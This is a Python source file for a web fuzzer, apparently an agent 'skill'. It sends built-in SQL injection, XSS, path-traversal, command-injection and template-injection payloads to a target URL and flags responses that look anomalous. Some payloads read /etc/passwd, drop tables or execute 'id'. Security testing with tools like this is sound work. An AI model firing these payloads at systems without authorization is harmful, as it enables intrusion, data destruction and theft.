"""
Intelligent Web Fuzzing Engine

AI-powered web application fuzzing with:
- Smart payload generation
- Context-aware fuzzing
- Wordlist management
- Response analysis
"""

import os
import sys
import re
import json
import logging
import time
from pathlib import Path
from typing import Dict, List, Any, Optional, Generator
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from urllib.parse import urlparse, urlencode, parse_qs
import random

logger = logging.getLogger(__name__)


class FuzzMode(Enum):
    DIRECTORY = "directory"
    PARAMETER = "parameter"
    HEADER = "header"
    VHOST = "vhost"
    SUBDOMAIN = "subdomain"


class PayloadType(Enum):
    GENERIC = "generic"
    SQLI = "sqli"
    XSS = "xss"
    LFI = "lfi"
    RCE = "rce"
    SSTI = "ssti"


# Built-in payloads
PAYLOADS = {
    PayloadType.GENERIC: [
        # Common directories
        "admin", "login", "dashboard", "api", "config", "backup",
        "uploads", "images", "js", "css", "static", "assets",
        "wp-admin", "wp-content", "phpmyadmin", ".git", ".env",
        "robots.txt", "sitemap.xml", "web.config", "crossdomain.xml",
        # Common files
        "index.php", "index.html", "config.php", "database.sql",
        "backup.zip", "backup.tar.gz", "dump.sql", ".htaccess",
        # Variations
        "Admin", "ADMIN", "administrator", "adminpanel", "admin_panel",
    ],
    PayloadType.SQLI: [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "1' AND '1'='1", "1 AND 1=1", "1' AND 1=1--",
        "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
        "'; DROP TABLE users--", "1; SELECT * FROM users--",
        "admin'--", "admin' #", "' OR ''='",
        "1' ORDER BY 1--", "1' ORDER BY 10--",
        "' AND SLEEP(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "-1' UNION SELECT @@version--",
    ],
    PayloadType.XSS: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert`1`>",
        "\"><img src=x onerror=alert(1)>",
    ],
    PayloadType.LFI: [
        "../etc/passwd", "....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd%00", "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..\\..\\..\\..\\windows\\win.ini",
        "/proc/self/environ", "/var/log/apache2/access.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain,<?php phpinfo();?>",
        "expect://id", "file:///etc/passwd",
    ],
    PayloadType.RCE: [
        "; id", "| id", "|| id", "& id", "&& id",
        "`id`", "$(id)", "; cat /etc/passwd",
        "| cat /etc/passwd", "|| cat /etc/passwd",
        "; ls -la", "| ls -la", "; whoami", "| whoami",
        "{{7*7}}", "${7*7}", "${{7*7}}",
        "; ping -c 3 localhost", "| ping -c 3 localhost",
        "; sleep 5", "| sleep 5",
    ],
    PayloadType.SSTI: [
        "{{7*7}}", "${7*7}", "${{7*7}}", "#{7*7}",
        "{{config}}", "{{self}}", "{{''.__class__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.mro()[2].__subclasses__()}}",
        "{{config.items()}}", "${object.class}",
        "{{request.application.__globals__}}",
        "<%= 7*7 %>", "{php}echo 7*7;{/php}",
        "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
    ],
}

# Common User-Agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]


@dataclass
class FuzzResult:
    """Result of a single fuzz attempt."""
    url: str
    payload: str
    status_code: int = 0
    content_length: int = 0
    word_count: int = 0
    line_count: int = 0
    response_time: float = 0.0
    content_type: str = ""
    interesting: bool = False
    reason: str = ""


@dataclass
class FuzzStatistics:
    """Statistics for fuzz run."""
    total_requests: int = 0
    successful: int = 0
    errors: int = 0
    interesting: int = 0
    duration: float = 0.0
    requests_per_second: float = 0.0


@dataclass
class FuzzRunResult:
    """Complete fuzz run result."""
    status: str
    target: str
    mode: str
    payload_type: str
    results: List[FuzzResult] = field(default_factory=list)
    interesting_results: List[FuzzResult] = field(default_factory=list)
    statistics: FuzzStatistics = field(default_factory=FuzzStatistics)
    report: str = ""


class WebFuzzer:
    """
    Intelligent Web Fuzzing Engine.
    """
    
    def __init__(
        self,
        rate_limit: float = 0.0,
        timeout: int = 10,
        follow_redirects: bool = False,
    ):
        self.rate_limit = rate_limit
        self.timeout = timeout
        self.follow_redirects = follow_redirects
        self.session = None
    
    def _get_session(self):
        """Get or create requests session."""
        if self.session is None:
            try:
                import requests
                self.session = requests.Session()
            except ImportError:
                logger.error("requests library required for fuzzing")
                raise
        return self.session
    
    def _get_payloads(
        self,
        payload_type: PayloadType,
        wordlist: str = None,
    ) -> Generator[str, None, None]:
        """Generate payloads for fuzzing."""
        # Use custom wordlist if provided
        if wordlist:
            wordlist_path = Path(wordlist)
            if wordlist_path.exists():
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            yield line
                return
        
        # Use built-in payloads
        for payload in PAYLOADS.get(payload_type, PAYLOADS[PayloadType.GENERIC]):
            yield payload
    
    def _build_url(self, target: str, payload: str, mode: FuzzMode) -> str:
        """Build URL with payload substitution."""
        if 'FUZZ' in target:
            return target.replace('FUZZ', payload)
        
        # Mode-specific URL building
        if mode == FuzzMode.DIRECTORY:
            return f"{target.rstrip('/')}/{payload}"
        elif mode == FuzzMode.PARAMETER:
            parsed = urlparse(target)
            params = parse_qs(parsed.query)
            # Replace first param value
            if params:
                first_key = list(params.keys())[0]
                params[first_key] = [payload]
                new_query = urlencode(params, doseq=True)
                return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        return target.replace('FUZZ', payload) if 'FUZZ' in target else f"{target}/{payload}"
    
    def _analyze_response(
        self,
        response,
        payload: str,
        baseline: Dict[str, Any] = None,
    ) -> FuzzResult:
        """Analyze response for interesting characteristics."""
        content = response.text
        
        result = FuzzResult(
            url=str(response.url),
            payload=payload,
            status_code=response.status_code,
            content_length=len(content),
            word_count=len(content.split()),
            line_count=content.count('\n') + 1,
            response_time=response.elapsed.total_seconds(),
            content_type=response.headers.get('Content-Type', ''),
        )
        
        # Check for interesting responses
        interesting_reasons = []
        
        # Status code indicators
        if response.status_code in [200, 201, 301, 302, 403]:
            if baseline and response.status_code != baseline.get('status_code'):
                interesting_reasons.append(f"Status changed to {response.status_code}")
        
        # Size changes
        if baseline:
            size_diff = abs(result.content_length - baseline.get('content_length', 0))
            if size_diff > 100:
                interesting_reasons.append(f"Size diff: {size_diff}")
        
        # Error messages
        error_indicators = ['error', 'exception', 'warning', 'syntax', 'stack trace']
        for indicator in error_indicators:
            if indicator.lower() in content.lower():
                interesting_reasons.append(f"Contains: {indicator}")
                break
        
        # Payload reflection
        if payload in content:
            interesting_reasons.append("Payload reflected")
        
        # Time-based
        if result.response_time > 5:
            interesting_reasons.append(f"Slow response: {result.response_time:.2f}s")
        
        if interesting_reasons:
            result.interesting = True
            result.reason = "; ".join(interesting_reasons)
        
        return result
    
    def fuzz(
        self,
        target: str,
        mode: FuzzMode = FuzzMode.DIRECTORY,
        payload_type: PayloadType = PayloadType.GENERIC,
        wordlist: str = None,
        max_requests: int = 1000,
    ) -> FuzzRunResult:
        """
        Execute fuzzing run.
        """
        start_time = datetime.utcnow()
        results = []
        interesting = []
        stats = FuzzStatistics()
        
        session = self._get_session()
        baseline = None
        
        # Get payloads
        payloads = list(self._get_payloads(payload_type, wordlist))[:max_requests]
        
        for i, payload in enumerate(payloads):
            try:
                # Build URL
                url = self._build_url(target, payload, mode)
                
                # Make request
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                }
                
                response = session.get(
                    url,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=self.follow_redirects,
                )
                
                # Capture baseline from first response
                if baseline is None:
                    baseline = {
                        'status_code': response.status_code,
                        'content_length': len(response.text),
                    }
                
                # Analyze response
                result = self._analyze_response(response, payload, baseline)
                results.append(result)
                
                if result.interesting:
                    interesting.append(result)
                
                stats.successful += 1
                
                # Rate limiting
                if self.rate_limit > 0:
                    time.sleep(self.rate_limit)
                    
            except Exception as e:
                logger.debug(f"Request error for {payload}: {e}")
                stats.errors += 1
            
            stats.total_requests += 1
        
        # Calculate statistics
        stats.interesting = len(interesting)
        stats.duration = (datetime.utcnow() - start_time).total_seconds()
        if stats.duration > 0:
            stats.requests_per_second = round(stats.total_requests / stats.duration, 2)
        
        # Generate report
        report = self._generate_report(target, mode, payload_type, interesting, stats)
        
        return FuzzRunResult(
            status="success",
            target=target,
            mode=mode.value,
            payload_type=payload_type.value,
            results=results,
            interesting_results=interesting,
            statistics=stats,
            report=report,
        )
    
    def _generate_report(
        self,
        target: str,
        mode: FuzzMode,
        payload_type: PayloadType,
        interesting: List[FuzzResult],
        stats: FuzzStatistics,
    ) -> str:
        """Generate fuzzing report."""
        report = f"""# Web Fuzzing Report

## Target: {target}
- Mode: {mode.value}
- Payload Type: {payload_type.value}

## Statistics
- Total Requests: {stats.total_requests}
- Successful: {stats.successful}
- Errors: {stats.errors}
- Interesting: {stats.interesting}
- Duration: {stats.duration:.2f}s
- RPS: {stats.requests_per_second}

## Interesting Results ({len(interesting)})
"""
        for r in interesting[:50]:
            report += f"""
### {r.url}
- Payload: `{r.payload}`
- Status: {r.status_code}
- Size: {r.content_length}
- Time: {r.response_time:.3f}s
- Reason: {r.reason}
"""
        
        return report


def run(params: Dict[str, Any]) -> Dict[str, Any]:
    """
    Main entry point for Web Fuzzer skill.
    """
    target = params.get('target', '')
    mode_str = params.get('mode', 'directory')
    payload_type_str = params.get('payload_type', 'generic')
    wordlist = params.get('wordlist')
    max_requests = params.get('max_requests', 100)
    rate_limit = params.get('rate_limit', 0.0)
    
    if not target:
        return {
            'status': 'error',
            'message': 'target parameter required',
        }
    
    try:
        mode = FuzzMode(mode_str)
    except ValueError:
        mode = FuzzMode.DIRECTORY
    
    try:
        payload_type = PayloadType(payload_type_str)
    except ValueError:
        payload_type = PayloadType.GENERIC
    
    try:
        fuzzer = WebFuzzer(rate_limit=rate_limit)
        result = fuzzer.fuzz(
            target=target,
            mode=mode,
            payload_type=payload_type,
            wordlist=wordlist,
            max_requests=max_requests,
        )
        
        return {
            'status': result.status,
            'target': result.target,
            'mode': result.mode,
            'payload_type': result.payload_type,
            'interesting_count': len(result.interesting_results),
            'interesting': [asdict(r) for r in result.interesting_results[:20]],
            'statistics': asdict(result.statistics),
            'report': result.report,
        }
        
    except Exception as e:
        logger.error(f"Fuzzing error: {e}")
        return {
            'status': 'error',
            'message': str(e),
        }


def main():
    """CLI entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Web Fuzzer')
    parser.add_argument('target', help='Target URL with FUZZ placeholder')
    parser.add_argument('--mode', '-m',
                        choices=['directory', 'parameter', 'header', 'vhost', 'subdomain'],
                        default='directory')
    parser.add_argument('--payload-type', '-p',
                        choices=['generic', 'sqli', 'xss', 'lfi', 'rce', 'ssti'],
                        default='generic')
    parser.add_argument('--wordlist', '-w', help='Custom wordlist')
    parser.add_argument('--max-requests', '-n', type=int, default=100)
    parser.add_argument('--rate-limit', '-r', type=float, default=0.0)
    
    args = parser.parse_args()
    
    result = run({
        'target': args.target,
        'mode': args.mode,
        'payload_type': args.payload_type,
        'wordlist': args.wordlist,
        'max_requests': args.max_requests,
        'rate_limit': args.rate_limit,
    })
    
    print(json.dumps(result, indent=2, default=str))


if __name__ == '__main__':
    main()
